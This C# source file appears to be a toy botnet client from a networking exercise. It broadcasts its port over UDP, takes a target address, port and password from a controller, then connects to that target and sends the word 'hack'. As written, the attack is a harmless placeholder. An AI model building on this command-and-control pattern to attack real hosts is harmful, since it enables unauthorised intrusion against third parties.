using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Timers;
namespace BotClients
{
	public class Program
	{
		static int port_ = FreeTcpPort();
		static UdpClient client = new UdpClient(port_);
		static IPEndPoint ep = new IPEndPoint(IPAddress.Broadcast, port_); // endpoint where server is listening

	
		public static void  Main(string[] args)
		{
			
			///int port2 = ((IPEndPoint)client.Client.LocalEndPoint).Port;
			Console.WriteLine("Bot is listening on port " + port_);
			Thread listenThread = new Thread(() =>
			{
				//try
				//{
					byte[] receivedData = client.Receive(ref ep);
					byte[] ip_to_attack = new byte[4];
					byte[] port_to_attack = new byte[2];
					byte[] pass_to_attack = new byte[6];
					byte[] name_of_server = new byte[32];
					int j = 0;
					for (int i = 0; i < 4; i++)
					{
						ip_to_attack[j] = receivedData[i];
						j++;
					}
					j = 0;
					for (int i = 4; i < 6; i++)
					{
						port_to_attack[j] = receivedData[i];
						j++;
					}
					j = 0;
					for (int i = 6; i < 12; i++)
					{
						pass_to_attack[j] = receivedData[i];
						j++;
					}
					j = 0;
					for (int i = 12; i < 44; i++)
					{
						name_of_server[j] = receivedData[i];
						j++;
					}
					Console.WriteLine("bot " + receivedData);
					attack(ip_to_attack, port_to_attack, pass_to_attack, name_of_server);
				//}
				//catch (Exception e)
				//{
				//	Console.WriteLine("exp " + e.Message);
				//}

			});
			listenThread.Start();
				//Console.Write("receive data from " + ep.ToString());
			while (true)
			{

			
				byte[] int_bytes = BitConverter.GetBytes((Int16)ep.Port);
				//if (BitConverter.IsLittleEndian)
				//{
				//	Array.Reverse(int_bytes);
				//	int_bytes[0] = int_bytes[2];
				//	int_bytes[1] = int_bytes[3];
				//}
				// send data
				client.Send(int_bytes, int_bytes.Length, new IPEndPoint(IPAddress.Broadcast, 31337) );

				Thread.Sleep(1000);
			}
		
		}
		public static void attack(byte[] ip_to_attack, byte[] port_to_attack, byte[] pass_to_attack, byte[] name_of_server)
		{
			
			Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
			IPAddress[] ipnew = Dns.GetHostAddresses(Dns.GetHostName());
			IPAddress temp = new IPAddress(ip_to_attack);
			IPEndPoint ipEnd = new IPEndPoint(new IPAddress(ip_to_attack), BitConverter.ToUInt16(port_to_attack, 0));
			//IPEndPoint ipEnd = new IPEndPoint(ipnew[1], BitConverter.ToUInt16(port_to_attack, 0));

			s.Connect(ipEnd);
			
			s.Send(System.Text.Encoding.ASCII.GetBytes("hack"));
		
			
			Console.ReadLine();
			s.Close();
		}
		static int FreeTcpPort()
		{
			TcpListener l = new TcpListener(IPAddress.Loopback, 0);
			l.Start();
			int port = ((IPEndPoint)l.LocalEndpoint).Port;
			l.Stop();
			return port;
		}

	}
}